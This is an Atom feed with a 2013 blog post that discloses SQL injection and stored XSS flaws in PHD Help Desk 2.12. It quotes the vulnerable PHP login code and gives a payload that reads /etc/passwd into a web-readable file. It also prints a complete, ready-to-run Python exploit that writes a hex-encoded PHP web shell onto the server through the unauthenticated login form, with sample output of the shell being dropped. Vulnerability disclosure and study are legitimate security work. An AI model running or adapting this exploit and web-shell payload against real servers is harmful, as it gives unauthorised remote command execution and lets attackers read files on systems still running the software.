<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: phd | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/phd/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2019-08-22T10:30:15-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[PHD Help Desk 2.12 - SQLi/XSS]]></title>
    <link href="http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss/"/>
    <updated>2013-06-02T22:55:27-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss</id>
    <content type="html"><![CDATA[<p><a href="http://www.p-hd.com.ar/">PHD Help Desk</a> is a help desk application used for managing help tickets in corporate/enterprise environments.  The latest version (2.12) is vulnerable to, well, quite a few instances of SQLi and XSS.  I&rsquo;ll try and go through a couple, but there are so many it&rsquo;s sort of embarrassing, and none of them are at all complex.  The software is clocking ~200 downloads/week on Sourceforge, and no telling how many off their website, so it&rsquo;s definitely still out there somewhere.  These issues have been disclosed to the vendor and a generous amount of time to fix them has since passed.</p>

<p>The first place we&rsquo;ll start is <code>login.php</code>, which tellingly holds all of the login logic.  Here&rsquo;s the relevant bit:</p>

<p>```
$operador=trim(strip_tags($_POST[operador]));
$query=&ldquo;SELECT * FROM {$MyPHD}operador WHERE operador_id=&lsquo;$operador&rsquo;&rdquo;;
$result=mysql_query($query) or die(mysql_error());
$q_filas=mysql_num_rows($result);</p>

<p>if($q_filas!=1)</p>

<pre><code>   {$mensaje=$Oper_not_autorized;
    require($Include.'login.inc');
    exit();
   }
</code></pre>

<h3>Ahora verifico la contrase√±a</h3>

<p>$md5_contrasenia=md5($_POST[&lsquo;contrasenia&rsquo;]);</p>

<p>$query=&ldquo;SELECT * FROM {$MyPHD}operador WHERE operador_id=&lsquo;$operador&rsquo; AND contrasenia=&lsquo;$md5_contrasenia&rsquo;&rdquo;;
$result=mysql_query($query) or die (mysql_error());;
$q_filas=mysql_num_rows($result);</p>

<p>if ($q_filas!=1)</p>

<pre><code>         {$mensaje=$Invalid_passwd;
         require($Include.'login.inc');
         exit();
        }
</code></pre>

<p>$data=mysql_fetch_array($result);
if ($data[&lsquo;nivel&rsquo;]&lt;1)</p>

<pre><code>           {$mensaje=$Oper_not_autorized;
            require($Include.'login.inc');
            exit();
           }
</code></pre>

<p>```</p>

<p>This doesn&rsquo;t even really try to sanitize anything.  <a href="http://php.net/manual/en/function.strip-tags.php">strip_tags</a> is used to remove HTML and PHP tags from a string, and <a href="http://php.net/manual/en/function.trim.php">trim</a> strips whitespace; what?  It pulls out the username, checks it in the database, then pulls the password, md5&rsquo;s it, and checks that in the database.  Plenty of opportunity for SQLi, but no way to get around the login screen with a simple <code>' OR '1=1</code>, due to the final query using the md5 of the password.  We could use a malicious username and comment that out, but then the first query would fail.  So instead, we&rsquo;ll just use the username to run malicious queries.</p>

<p>Submitting the following POST data to login.php will dump <code>/etc/passwd</code></p>

<p><code>
operador=' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE '/var/www/phd_2_12/psswd&amp;contrasenia=asdf&amp;submit=Enter&amp;captcha=
</code></p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg">http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg</a>"></p>

<p>With this, we can naturally obtain a web shell, as demonstrated by the exploit code I&rsquo;ve developed:</p>

<p>```
root@jali:~# python phd_sqli.py -h
usage: phd_sqli.py [-h] [-i IP] [-p ROOTP] [-w PATH]</p>

<p>optional arguments:
  -h, &mdash;help  show this help message and exit
  -i IP       server address
  -p ROOTP    path to login.php (/phd_2_12)
  -w PATH     writable web path (/var/www/phd_2_12) for shell
root@jali:~# python phd_sqli.py -i 192.168.1.83
[!] Dropping web shell on 192.168.1.83&hellip;
[!] Shell dropped.  <a href="http://192.168.1.83/phd_2_12/0m05k.php?rr=ls">http://192.168.1.83/phd_2_12/0m05k.php?rr=ls</a>
root@jali:~#
<code>``
As a note,</code>strip_slashes` prevents us from submitting anything that includes HTML or PHP tags in it. So I&rsquo;ve gotten around that by simply hex encoding the string:</p>

<p>```</p>

<h1>&lt;? php system($_GET[&ldquo;rr&rdquo;]); ?></h1>

<p>data = urllib.urlencode({&lsquo;operador&rsquo;:(&lsquo;\&rsquo; UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'</p>

<pre><code>                                 ',2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE'
                                 ' \'{0}/{1}.php'.format(options.path,shell)),
                     'contrasenia':'pass',
                     'submit':'Enter',
                     'captcha':''})
</code></pre>

<p>```</p>

<p>There&rsquo;s another SQLi vulnerability in <code>abro_adjunto.php</code>, which requires authentication to the application:</p>

<p>```
if (isSet($_GET[&lsquo;file&rsquo;]))</p>

<pre><code>{$query="SELECT *
         FROM {$MyPHD}sigo_ticket
         WHERE seq_sigo_ticket_id={$_GET['file']} ";

 $result=mysql_query($query) or die (mysql_error());

 $row = mysql_fetch_array($result);

 $tipo_adjunto = $row['tipo_adjunto'];
 $adjunto = $row['adjunto'];
 $nombre_adjunto = $row['nombre_adjunto'];

 if(strlen($nombre_adjunto)&gt;1)
    {header("Content-type: $tipo_adjunto");
     header("Content-Disposition: attachment; filename=\"$nombre_adjunto\"");
     echo $adjunto;
    }
 else
    {require('head.inc');
     echo "&lt;div class='error'&gt;INVALID CALL &lt;/div&gt;";
    }
}
</code></pre>

<p>```</p>

<p>And the sanitization for this (and most files, really) is as follows:</p>

<p>```
if (get_magic_quotes_gpc())</p>

<pre><code>{ foreach($_GET as $clave =&gt; $valor)
  {$_GET[$clave]=stripslashes($_GET[$clave]);
  }
}
</code></pre>

<p>foreach($_GET as $clave => $valor)</p>

<pre><code> {$_GET[$clave]=trim(htmlentities($_GET[$clave],ENT_QUOTES));
 }
</code></pre>

<p>```</p>

<p><a href="http://php.net/manual/en/function.htmlentities.php">htmlentities</a>, when specified with the ENT_QUOTES flag, will convert both single and double quotes into HTML entities, and will thus not be injectable.  However, the above query doesn&rsquo;t even use quotes, thus there is nothing to escape.</p>

<p>There&rsquo;s stored XSS within all Attributes (Contact, Process, State, Type) that&rsquo;s loaded when viewing users:</p>

<p><img class="center <a" src="href="http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg">http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg</a>"></p>

<p>Here&rsquo;s the code for dropping a web shell; enjoy:</p>

<p>```</p>

<h1>Exploit Title: PHD Help Desk 2.12 SQLi</h1>

<h1>Date: 05/24/2013</h1>

<h1>Exploit Author: drone (@dronesec)</h1>

<h1>Vendor Homepage: <a href="http://www.p-hd.com.ar/">http://www.p-hd.com.ar/</a></h1>

<h1>Software Link: <a href="http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip">http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip</a></h1>

<h1>Version: 2.12</h1>

<h1>Tested on: Ubuntu 12.04 (apparmor disabled)</h1>

<p>&ldquo;&rdquo;&ldquo; This app is so full of SQLi &amp; XSS; if you&rsquo;re looking for</p>

<pre><code>practice with real web apps, this is a good place to go.

You don't need auth for this.
@dronesec
</code></pre>

<p>&ldquo;&rdquo;&ldquo;
from argparse import ArgumentParser
import string
import random
import urllib, urllib2
import sys</p>

<p>def run(options):</p>

<pre><code>print '[!] Dropping web shell on %s...'%(options.ip)

shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))

# &lt;? php system($_GET["rr"]); ?&gt;
data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
                                ',null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE'
                                    ' \'{0}/{1}.php'.format(options.path,shell)),
                         'contrasenia':'pass',
                         'submit':'Enter',
                         'captcha':''})

urllib2.urlopen('http://{0}{1}/login.php'.format(options.ip, options.rootp), data)
print '[!] Shell dropped.  http://%s%s/%s.php?rr=ls'%(options.ip,options.rootp,shell)
</code></pre>

<p>def parse():</p>

<pre><code>parser = ArgumentParser()
parser.add_argument('-i',help='server address',action='store',dest='ip')
parser.add_argument('-p',help='path to login.php (/phd_2_12)',action='store',
            default='/phd_2_12', dest='rootp')
parser.add_argument('-w',help='writable web path (/var/www/phd_2_12) for shell',
            default='/var/www/phd_2_12/', action='store', dest='path')

options = parser.parse_args()
if not options.ip:
    parser.print_help()
    sys.exit(1)

options.path = options.path if options.path[-1] != '/' else options.path[:-1]
options.rootp = options.rootp if options.path[-1] != '/' else options.path[:-1]
return options
</code></pre>

<p>if <strong>name</strong>==&ldquo;<strong>main</strong>&rdquo;:</p>

<pre><code>run(parse())
</code></pre>

<p>```</p>

<p><a href="http://www.exploit-db.com/exploits/25915/">Exploit</a></p>
]]></content>
  </entry>
  
</feed>
